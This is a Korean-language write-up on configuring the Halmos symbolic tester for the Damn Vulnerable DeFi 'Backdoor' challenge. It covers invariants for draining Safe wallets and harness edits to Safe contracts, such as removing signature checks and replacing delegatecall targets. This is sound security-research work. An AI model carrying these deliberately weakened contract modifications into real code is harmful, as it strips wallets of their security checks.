# Halmos 대 Backdoor
## Halmos 버전
halmos 0.2.4.dev6+g606ac51
## 서문
독자가 다음의 이전 문제 해결에 대한 글들에 익숙하다고 강력히 가정합니다:
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)

여기서 주요 아이디어는 대부분 반복되므로 다시 다루지 않을 것입니다.

또한 이 글은 아마도 전체 시리즈 중에서 복잡하지만 매우 가치 있는 정보로 가장 과부하된 글일 것입니다. 이 작업의 프레임워크 내에서 해결해야 할 문제의 수는 정말 비정상적으로 많습니다. 따라서 정보를 더 잘 이해하기 위해 **backdoor**에 대한 "일반적인" 해결 방법과 관련 컨트랙트의 로직에 대한 지식을 업데이트하는 것을 강력히 권장합니다.

마지막으로 한 가지 더: 이번 챌린지에서는 **safe-smart-account** 라이브러리 컨트랙트에 많은 변경이 있을 것입니다. 편의를 위해 **safe-smart-account**의 "심볼릭" 버전은 `lib/safe_copy`에 별도로 배치되었습니다.
## 준비
### 공통 필수 조건
1. **Backdoor.t.sol** 파일을 **BackdoorHalmos.t.sol**로 복사하세요.
2. `test_backdoor()`를 `check_backdoor()`로 이름을 바꾸세요. 그래야 Halmos가 이 테스트를 심볼릭하게 실행합니다.
3. **makeAddr()** 치트 코드 사용을 피하세요:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    address[] users = [address(0xcafe0003), address(0xcafe0004), address(0xcafe0005), address(0xcafe0006)];
    ```
4. **GlobalStorage** 컨트랙트를 생성하고 컨트랙트의 주소-이름 쌍을 저장하세요:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(singletonCopy), "Safe");
        glob.add_addr_name_pair(address(walletFactory), "SafeProxyFactory");
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        glob.add_addr_name_pair(address(walletRegistry), "WalletRegistry");
        ...
    ```
5. 모든 컨트랙트 주소를 출력하세요:
    ```solidity
    function check_backdoor() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("singletonCopy\t", address(singletonCopy));
        console.log("walletFactory\t", address(walletFactory));
        console.log("token\t\t", address(token));
        console.log("walletRegistry\t", address(walletRegistry));
        console.log("attacker\t\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 4
    ...
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] singletonCopy      0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] walletFactory      0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] token              0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] walletRegistry     0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ...
    ```
6. `vm.getNonce`는 지원되지 않는 치트 코드입니다. 삭제하세요.
### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
function _isSolved() private view {
    // Player must have executed a single transaction
    assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

    for (uint256 i = 0; i < users.length; i++) {
        address wallet = walletRegistry.wallets(users[i]);

        // User must have registered a wallet
        assertTrue(wallet != address(0), "User didn't register a wallet");

        // User is no longer registered as a beneficiary
        assertFalse(walletRegistry.beneficiaries(users[i]));
    }

    // Recovery account must own all tokens
    assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
}
```
처음에는 이전 챌린지들과 유추하여 `walletRegistry`를 비우는 시나리오를 찾을 것이라고 생각할 수 있습니다. 하지만 사실 이것은 유효한 동작입니다. 그것은 사용자에게 보상으로 토큰을 분배해야 합니다. 따라서 대신 생성된 지갑의 잔액을 비울 수 있는지 확인합니다:
```solidity
function _isSolved() private view {
    for (uint256 i = 0; i < users.length; i++) {
        address wallet = walletRegistry.wallets(users[i]);

        if (wallet != address(0)) {
            assert(token.balanceOf(wallet) >= 10e18);
        }
    }
}
```
그리고 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#invariants)의 접근 방식을 고려하여, `allowance`에 대해 또 다른 다소 명백한 불변 조건을 추가할 것입니다:
```solidity
...
address symbolic_spender = svm.createAddress("symbolic_spender");
assert(token.allowance(wallet, symbolic_spender) == 0);
...
```
## 커버리지 개선
### delegatecall
처음으로 타겟 호출 패턴을 만나지만, 새로운 형태입니다: 이번에는 `call`이 아니라 `delegatecall`을 합니다:
```javascript
Path #22:
...
            CALL Safe::simulateAndRevert(Concat(p_targetContract_address_76fe5e4_49(), 0x0000000000000000000000000000000000000000000000000000000000000040, p_calldataPayload_length_ea68c34_51(), p_calldataPayload_bytes_7c96bce_50()))
                DELEGATECALL Safe::Extract(p_calldataPayload_bytes_7c96bce_50())(Extract(p_calldataPayload_bytes_7c96bce_50()))
                ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_calldataPayload_bytes_7c96bce_50)'))
...
```
```solidity
/**
 * @dev Performs a delegatecall on a targetContract in the context of self.
 * Internally reverts execution to avoid side effects (making it static).
 *
 * This method reverts with data equal to `abi.encode(bool(success), bytes(response))`.
 * Specifically, the `returndata` after a call to this method will be:
 * `success:bool || response.length:uint256 || response:bytes`.
 *
 * @param targetContract Address of the contract containing the code to execute.
 * @param calldataPayload Calldata that should be sent to the target contract (encoded method name and arguments).
 */
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)

        mstore(0x00, success)
        mstore(0x20, returndatasize())
        returndatacopy(0x40, 0, returndatasize())
        revert(0, add(returndatasize(), 0x40))
    }
}
```
우리는 심볼릭 타겟의 `delegatecall`을 매우 간단하게 처리할 것입니다: **SymbolicAttacker**를 유일한 타겟으로 지정하고, 유일한 함수는 `handle_delegatecall()` 콜백이어야 하며, 여기서 익숙한 방법을 사용하여 함수를 심볼릭하게 반복할 것입니다:
```solidity
contract SymbolicAttacker is Test, SymTest {
...
    function handle_delegatecall() public {
        execute_tx("handle_delegatecall_target");
    }
...
}
```
```solidity
...
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    vm.assume(targetContract == address(0xaaaa0007)); // SymbolicAttacker
    vm.assume(bytes4(calldataPayload) == bytes4(keccak256("handle_delegatecall()")));
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)
        ...
}
```
`delegatecall` 충돌이 있는 몇 군데가 더 있습니다:
```javascript
Path #185:
...
            CALL SafeProxyFactory::createProxyWithNonce(...)
            ...
                CALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    DELEGATECALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    ↩ CALLDATALOAD 0x ((error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_initializer_bytes_56179b1_14)'))
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }
    }
}
```
이 트레이스는 약간 까다로워서 여기서 무슨 일이 일어났는지 명확하지 않습니다. 하지만 **SafeProxy**의 구현을 보면 모든 것이 명확해질 것입니다:
```solidity
contract SafeProxy {
    // Singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;

    /**
     * @notice Constructor function sets address of singleton contract.
     * @param _singleton Singleton address.
     */
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```
Halmos는 자동으로 `fallback()`(이 컨트랙트의 유일한 함수)을 수행합니다. 그리고 그 안에는 싱글톤으로의 `delegatecall`이 있습니다. 이 오류를 수정하기 전에, 현재 Halmos의 맥락에서 이 기능이 일반적으로 어떻게 작동하는지 이야기해 봅시다. 

이 컨트랙트는 **safeProxy**를 호출하는 동안 **Safe**의 모든 함수를 사용하는 것이 편리하도록 작성되었습니다. 그리고 Halmos는 `proxy`에서 도달하려는 함수가 `singleton`에 존재하지 않는 경우를 처리하므로, 다시 `fallback`을 호출할 수 있습니다. 그래서 재귀에 대한 보호를 추가해야 합니다.

다음으로, `proxy`를 생성할 때 `singleton` 주소가 심볼릭 방식으로 전달되므로, 우리는 어떤 심볼릭 `singleton`과 작용합니다.

`SafeProxyFactory::deployProxy()` 내부에서 발생하는 "심볼릭 오프셋" 오류를 수정하면서, 이 `proxy`의 주요 로직을 손상시키지 않아야 합니다. 이 특정 케이스를 처리할 또 다른 `symbolic_fallback` 함수를 추가하는 것보다 더 나은 방법을 생각하기 어렵습니다:
```solidity
contract SafeProxy is FoundryCheats {
    address internal singleton;

    bool reent_guard = false;
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002));
    ...
    function symbolic_fallback() external payable {
        if (reent_guard) {
            revert();
        }
        reent_guard = true;
        address singleton_address;
        bytes memory initializer_data;
        (singleton_address, initializer_data) = glob.get_concrete_from_symbolic_optimized(singleton);
        (bool success,bytes memory returndata) = singleton_address.delegatecall(initializer_data);
        reent_guard = false;
        if (!success) {
            // Revert with the returned data
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
    
        // Return with the returned data
        assembly {
            return(add(returndata, 0x20), mload(returndata))
        }
    }
    
    fallback() external payable {
        // Check for mastercopy() call
        if (msg.sig == bytes4(keccak256("mastercopy()"))) {
            assembly {
                mstore(0x00, sload(singleton.slot))
                return(0x00, 32)
            }
        } else {
            _delegateCall();
        }
    }
    
    function _delegateCall() internal {
        (bool success, bytes memory returndata) = singleton.delegatecall(msg.data);
        if (!success) {
            // Revert with the returned data
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }

        // Return with the returned data
        assembly {
            return(add(returndata, 0x20), mload(returndata))
        }
    }
}
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        /*assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }*/
        proxy.symbolic_fallback();
    }
}
```

그리고 `delegatecall`이 있는 또 다른 곳:
```solidity
abstract contract Executor {
...
    function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
        if (operation == Enum.Operation.DelegateCall) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
            }
        } else {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
            }
        }
    }
...
}
```
이 부분은 **revert**를 발생시키지는 않지만, 더 일반적인(generic) 것으로 만들기 위해 Halmos가 자동으로 반복하게 하는 것보다 `delegatecall_handler`를 사용하는 것이 여전히 더 낫습니다.
```solidity
if (operation == Enum.Operation.DelegateCall) {
    // solhint-disable-next-line no-inline-assembly
    vm.assume(to == address(0xaaaa0007));
    vm.assume(bytes4(data) == bytes4(keccak256("handle_delegatecall()")));
    ...
```
### 일반적인 심볼릭 메모리 오프셋
심볼릭 calldata에 의한 일반적인 `call`도 있습니다:
```solidity
function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
...
   else {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
```
우리는 평소처럼 이것을 처리합니다:
```solidity
...
} else {
   address target = svm.createAddress("execute_target");
    bytes memory mydata;
    //Get some concrete target-name pair
    (target, mydata) = glob.get_concrete_from_symbolic_optimized(target);
    target.call(mydata);
    
    /*assembly {
        success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
    }*/
}
...
```
심볼릭 오프셋이 있는 또 다른 곳은 `Safe::execTransaction`의 서명 확인입니다:
```solidity
function execTransaction(
...
bytes calldata data,
...
bytes memory signatures
) public payable virtual returns (bool success) {
...
 bytes32 txHash;
// Use scope here to limit variable lifetime and prevent `stack too deep` errors
{
    bytes memory txHashData = encodeTransactionData(
        // Transaction info
        to,
        value,
        data,
        operation,
        safeTxGas,
        // Payment info
        baseGas,
        gasPrice,
        gasToken,
        refundReceiver,
        // Signature info
        nonce
    );
    // Increase nonce and execute transaction.
    nonce++;
    txHash = keccak256(txHashData);
    checkSignatures(txHash, txHashData, signatures);
...
}
```
다른 암호화 확인과 마찬가지로 이것을 처리해 봅시다: 데이터가 올바르게 입력되었다고 가정하고 이 로직을 단순히 제거합니다.
### OwnerIsNotABeneficiary 문제
이 문제를 고려하기 전에, 이것이 비교적 약한 PC에서 관련이 있다는 점을 명확히 할 가치가 있습니다. 경험상, 더 나은 CPU를 가진 강력한 PC에서 동일한 테스트를 실행하면 이 문제가 나타나지 않습니다. 미리 말하자면, 이 문제는 계산 문제 해결의 복잡성과 그로 인한 이러한 경우 Halmos의 불안정한 동작과 관련이 있습니다.

이제 테스트를 실행해 봅시다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
CALL SafeProxyFactory::createProxyWithCallback(...)
...
    CALL SafeProxy::symbolic_fallback(...)
    ...
        DELEGATECALL SafeProxy::setup(...)
    ...
    CALL  0xaaaa0006::proxyCreated(...)
    ...
        REVERT OwnerIsNotABeneficiary ((error: Revert())
    ...
```
이 revert는 주목할 가치가 있습니다. 왜냐하면 이 시점에서 이 revert 이후의 이 함수의 모든 코드가 차단되기 때문입니다. 만약 이 지점(적어도 제 약한 PC에서는)에 도달한다면 이 revert는 100% 발생합니다.
```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
...
    address walletOwner;
    unchecked {
        walletOwner = owners[0];
    }
    if (!beneficiaries[walletOwner]) {
        revert OwnerIsNotABeneficiary(); // This revert occurs every time!
    }

    address fallbackManager = _getFallbackManager(walletAddress);
    if (fallbackManager != address(0)) {
        revert InvalidFallbackManager(fallbackManager);
    }

    // Remove owner as beneficiary
    beneficiaries[walletOwner] = false;

    // Register the wallet under the owner's address
    wallets[walletOwner] = walletAddress;

    // Pay tokens to the newly created wallet
    SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
}
```
이 revert는 우리가 `createProxyWithCallback`에 유효한 `call`을 한 후에 발생합니다. `setup`이 실행되었지만, 어떤 이유로 Halmos는 `setup()` 중에 우리가 전달한 `owner`가 어떤 유효한 `owner`일 수 있다는 것을 이해하지 못합니다:
```solidity
function createProxyWithCallback(...) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
}
```
```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
...
) {
    setupOwners(_owners, _threshold);// owners setup is happening here
    ...
}
```
`OwnerIsNotABeneficiary` revert 이전에 `owners` 카운트 확인이 있다는 점을 감안할 때, 적어도 `owner`가 하나만 있는 시나리오는 봅니다:
```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
...
    address[] memory owners = Safe(walletAddress).getOwners();
    if (owners.length != EXPECTED_OWNERS_COUNT) { // EXPECTED_OWNERS_COUNT == 1
        revert InvalidOwnersCount(owners.length);
    }

    // Ensure the owner is a registered beneficiary
    address walletOwner;
    unchecked {
        walletOwner = owners[0];
    }
...
```

이 `owner`를 출력해서, 왜 Halmos가 이것이 유효할 수 있다는 것을 보지 못하는지 봅시다:
```solidity
...
console.log("walletOwner is");
console.log(walletOwner);
if (!beneficiaries[walletOwner]) {
    revert OwnerIsNotABeneficiary();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] 0x0000000000000000000000000000000000000000000000000000000000000000
...
```
뭐라고요? `0x0`? 왜 심볼릭이 아닐까요? 이 질문에 답하려면, 이 알고리즘이 `owners` 목록을 어떻게 저장하고 읽는지 이해해야 합니다:
```solidity
...
address internal constant SENTINEL_OWNERS = address(0x1);
mapping(address => address) internal owners;
    ...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    // Threshold can only be 0 at initialization.
    // Check ensures that setup function can only be called once.
    require(threshold == 0, "GS200");
    // Validate that threshold is smaller than number of added owners.
    require(_threshold <= _owners.length, "GS201");
    // There has to be at least one Safe owner.
    require(_threshold >= 1, "GS202");
    // Initializing Safe owners.
    address currentOwner = SENTINEL_OWNERS;
    for (uint256 i = 0; i < _owners.length; i++) {
        // Owner address cannot be null.
        address owner = _owners[i];
        require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
        // No duplicate owners allowed.
        require(owners[owner] == address(0), "GS204");
        owners[currentOwner] = owner;
        currentOwner = owner;
    }
    owners[currentOwner] = SENTINEL_OWNERS;
    ownerCount = _owners.length;
    threshold = _threshold;
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);

    // populate return array
    uint256 index = 0;
    address currentOwner = owners[SENTINEL_OWNERS];
    while (currentOwner != SENTINEL_OWNERS) {
        array[index] = currentOwner;
        currentOwner = owners[currentOwner];
        index++;
    }
    return array;
}
```
매핑에 소유자의 주소를 저장한 다음, 그것을 기반으로 배열을 만들 수 있는 영리한 알고리즘이 사용됩니다.
문제는 심볼릭 키에 의해 맵에 값을 할당하는 복잡한 작업이 `array`를 형성할 때 **solver**에 더 큰 부하를 준다는 것입니다. 할당된 시간 내에 처리하지 못하고 타임아웃되어, 배열은 유효한 값(적어도 심볼릭한 값) 대신 `0x0`을 얻습니다:
```solidity
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    for (uint256 i = 0; i < _owners.length; i++) {
        address owner = _owners[i];
        ...
        owners[currentOwner] = owner;
        currentOwner = owner;
    }
    owners[currentOwner] = SENTINEL_OWNERS;
    ...
}
function getOwners() public view returns (address[] memory) {
...
    while (currentOwner != SENTINEL_OWNERS) {
        array[index] = currentOwner;
        currentOwner = owners[currentOwner];
        index++;
    }
...
}
```
사실, 이런 Halmos의 동작을 잡거나 무엇이 잘못되었는지 이해하는 것조차 어렵습니다.

좋아요, 어떻게든 고쳐봅시다. 이 특정 케이스의 경우, 매핑을 통한 이 알고리즘을 버리고, 소유자가 2명 이하(Halmos가 기본적으로 고려하는 동적 배열의 가장 큰 크기)라고 가정하고 일반 배열을 사용할 것을 제안합니다.
이런 "직접적인" 알고리즘은 데이터를 더 단순한 형태로 저장하며, Halmos가 `owner`가 심볼릭 값이어야 한다는 것을 이해하기 더 쉽습니다:
```solidity
...
mapping(address => address) internal owners;
address[2] array_owners;
...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    ...
    for (uint256 i = 0; i < _owners.length; i++) {
        ...
        array_owners[i] = _owners[i];
    }
    ...
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);
    for (uint256 i = 0; i < ownerCount; i++)  {
        array[i] = array_owners[i];
    }
    return array;
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] Concat(0x000000000000000000000000, Extract(p__owners[0]_address_c7821fc_58()))
...
```
훨씬 낫네요! 이제 Halmos가 예를 들어 `owner`가 주소 `0xcafe0003`을 가진 **Alice**일 수 있는 시나리오를 볼 수 있으므로 아래 코드가 잠금 해제되었습니다.
### solver-timeout-branching halmos 옵션
이제 Halmos의 중요한 `--solver-timeout-branching` 매개변수로 넘어가 봅시다. `OwnerIsNotABeneficiary`는 이 챌린지에서 솔버가 불안정하게 동작할 수 있는 유일한 곳이 아닙니다(강력한 CPU에서도). 다른 실행에서 만들어진 모든 경로의 전체 트레이스가 담긴 여러 로그를 조사해보면, 많이 다르다는 것을 알 수 있습니다. Halmos는 특히 작업 머신이 과부하된 경우 비결정적으로 실행되기 시작합니다: 전체 함수가 무시되기도 했습니다. 이것은 솔버가 **분기(branching)**에 대처하지 못한다는 명확한 신호입니다. 간단히 말해: Halmos가 분기 문(예: `if()`)을 만날 때마다, 문이 **참**인지 **거짓**인지를 결정하는 솔버를 실행합니다. 그리고 불행히도, 때때로 솔버는 그것을 빨리 계산할 수 없습니다(특히 과부하된 수의 심볼릭 변수가 있는 복잡한 설정에서). 그래서 할당된 타임아웃(기본 타임아웃은 1ms)에 맞지 않아, 분기가 우리가 원하는 대로 발생하지 않습니다. 이 경우, Halmos는 수학적으로 불가능한 것으로 알려진 경로를 처리하기 시작할 수 있습니다. 보통 이것은 큰 문제가 아니지만, 경로 폭발(path explosion)에 취약한 매우 추상화가 과부하된 설정이 있다면, 그런 경로에 너무 많은 시간(심지어 몇 시간)을 소비하고 테스트 중에 유효하고 유용한 경로를 살펴보는 것조차 하지 못할 수 있습니다. 왜냐하면 너무 오래 걸리기 때문입니다. 따라서 더 정확한 분기를 위해 시간을 희생하고, 유효한 경로만 고려하는 시간을 벌 수 있는 메커니즘이 필요합니다!

그래서, 해결책은 사실 꽤 간단하지만 비용이 많이 듭니다. 시작 매개변수를 하나 더 추가하기만 하면 됩니다:
```javascript
--solver-timeout-branching 0
```
이것은 분기 솔버에 대한 타임아웃을 완전히 제거합니다.

하지만 반면에, 연산 속도는 상당히 감소했습니다. 제 머신에서는 초당 `~29000` 연산에서 `~8000`으로 떨어졌습니다. 그렇기 때문에 더 올바른 해결책은 작업 머신의 타임아웃 값을 조정하여, 연산 속도를 크게 늦추지 않으면서 실행마다 Halmos가 안정적으로 작동하도록 하는 것입니다.

저는 어쨌든 Halmos의 기능을 보여주기 위해 비용이 많이 들지만 안정적인 해결책으로 `0`을 사용할 것입니다. 하지만 다시 말하지만, 이 옵션은 현명하게 사용해야 합니다. 예를 들어, 이전 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload) 챌린지 테스트를 이 매개변수와 함께 실행하면 성능이 거의 완전히 죽고 몇 시간 동안 해결책을 찾지 못합니다.
### 테스트 중 create2 사용
이 챌린지에서 우리는 독특한 특징을 가지고 있습니다: 테스트의 로직은 테스트 중에 새로운 컨트랙트가 생성된다는 사실에 기반합니다.
```soliidty
function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
...
assembly {
    proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
}
require(address(proxy) != address(0), "Create2 call failed");
...
```
Halmos가 `create2`로 작업할 때 `salt` 로직을 완전히 무시하고 `0xbbbb****` 주소를 가진 새 컨트랙트를 생성한다는 점을 참고하세요. 사실 이것은 우리에게 편리합니다. 심볼릭 주소가 아니라 특정 주소가 되기 때문입니다.

그리고 물론, 어떤 컨트랙트가 생성되었다면 **GlobalStorage**에 추가되어야 한다는 것을 잊지 않습니다. 하지만 새 컨트랙트의 주소와 그 이름 "**SafeProxy**"만 추가하는 것은 순진한 생각일 것입니다:
```solidity
glob.add_addr_name_pair(address(proxy), "SafeProxy");
```
왜냐하면 **SafeProxy**는 어떤 함수도 구현하지 않기 때문입니다(`symbolic_fallback()`은 고려하지 맙시다). 대신, `singleton`에 구현된 모든 함수는 **SafeProxy**를 통해 호출될 수 있습니다. 따라서, **SafeProxy**의 주소이지만 calldata가 생성될 컨트랙트의 이름(즉, `singleton`)을 추가하는 것이 논리적일 것입니다:

```solidity
contract GlobalStorage is Test, SymTest {
...
/*
    ** The logic of this function is similar to the logic of get_concrete_from_symbolic, 
    ** with the difference that this time the name of the contract is returned 
    ** instead of the ready calldata
    */
    function get_contract_name_by_address (address /*symbolic*/ addr ) public
                                        returns (string memory name)
    {
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                name = names_by_addr[addresses[i]];
                return name;
            }
        }
        vm.assume(false);// Ignore cases when addr is not some concrete known address
    }
...
```
```solidity
function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
    ...
    string memory singleton_name = glob.get_contract_name_by_address(_singleton);
    glob.add_addr_name_pair(address(proxy), singleton_name);
    ...
}
```

## 최적화 및 휴리스틱
### 재귀 문제 해결 (Beating recursion issue)
```javascript
halmos --solver-timeout-assertion 0 --solver-timeout-branching 0 --function check_backdoor --loop 100 -vvvvv
...
Path #9642:
...
    CALL 0xaaaa0003::simulateAndRevert(...)
    ...
        CALL 0xaaaa0004::createProxyWithNonce(...)
    ...
            CALL 0xbbbb0016::0x7bb34722()
    ...
                DELEGATECALL 0xbbbb0016::setup
    ...
                    DELEGATECALL 0xbbbb0016::handle_delegatecall()
    ...
                        CALL 0xaaaa0004::createProxyWithCallback(...)
    ...
                            CALL 0xbbbb0022::0x7bb34722()
    ...                        
...
ERROR    ArgumentError: argument 1: RecursionError: maximum recursion depth exceeded 
```
설정의 높은 복잡성 때문에, `SafeProxyFactory::deployProxy` 함수에 접근하는 여러 방법이 있습니다. 게다가 이 함수를 통해 컨트랙트를 생성하면 다른 진입점에서 `deployProxy`를 다시 호출할 수 있습니다:
```solidity
function createProxyWithNonce(...) public {
    ...
    proxy = deployProxy(_singleton, initializer, salt);
    ...
}
...
function createChainSpecificProxyWithNonce(...) public {
   ...
   proxy = deployProxy(_singleton, initializer, salt);
   ...
}
...
function createProxyWithCallback(...) public {
    ...
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    ...
}
...
```
따라서 `get_concrete_from_symbolic_optimized`를 사용하여 재귀를 피하는 일반적인 방법은 우리에게 적합하지 않습니다. `createProxyWithNonce`는 `createProxyWithCallback` 내부에서 호출되므로, [naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/selfie/test/naive-receiver#proxy-heuristics)와 동일한 접근 방식을 사용하여, 전체 코드 커버리지를 희생하지 않으면서 `createProxyWithNonce`에 대한 직접적인 심볼릭 호출 시나리오를 단순히 잘라낼 수 있습니다. 우리는 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#solid-optimizations)에서 이미 익숙한 `add_banned_function_selector()`를 통해 이 함수들을 금지함으로써 이를 수행할 것입니다:
```solidity
function setUp() public {
    ...
    glob.add_banned_function_selector(bytes4(keccak256("createProxyWithNonce(address,bytes,uint256)")));
    glob.add_banned_function_selector(bytes4(keccak256("createChainSpecificProxyWithNonce(address,bytes,uint256)")));
    vm.stopPrank();
}
```
`createChainSpecificProxyWithNonce` 함수도 금지되었습니다. `createProxyWithNonce`와의 유일한 차이점은 생성된 salt이기 때문입니다. 그리고 Halmos는 `create2`를 통해 컨트랙트를 생성할 때 salt를 완전히 무시하므로 이 함수를 별도로 확인할 필요가 없습니다.
### 상태 스냅샷 (State snapshots)
지금까지 우리는 심볼릭 호출을 사용할 때, 그것이 **revert**로 끝났는지 아니면 트랜잭션이 성공했는지 확인한 적이 없습니다. 사실, 이것은 가능한 경로의 수를 부풀릴 뿐입니다. 트랜잭션이 실패하더라도 경로를 계속 확인하기 때문입니다. 그리고 경험상, 우리는 컨트랙트의 상태를 어떻게든 변경한 트랜잭션에만 관심이 있을 수 있습니다. 이제 Halmos 0.2.3 업데이트 이후 가능해진 **상태 스냅샷**을 통한 멋진 새로운 접근 방식을 사용할 것입니다.

그 본질은 간단합니다: 심볼릭 `call` 전에, 현재 시스템 상태의 `uint` 덤프를 생성합니다. 그 `call` 후에 - 덤프를 다시 읽고 이전 것과 비교합니다. 상태가 변경되지 않았다면, 그것은 "빈" 트랜잭션임이 보장되며 이 경로를 계속 실행할 의미가 없습니다.

그러한 접근 방식의 한 예:
```solidity
function execute_tx(string memory target_name) private {
    ...
    uint snap0 = vm.snapshotState();
    target.call(data);
    uint snap1 = vm.snapshotState();
    vm.assume(snap0 != snap1);
}
```
이 개선이 얼마나 강력한지 이해하기 위해, [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster) 실험에서 해결책을 찾는 데 5배의 속도 향상을 보였다고 말하는 것으로 충분합니다.
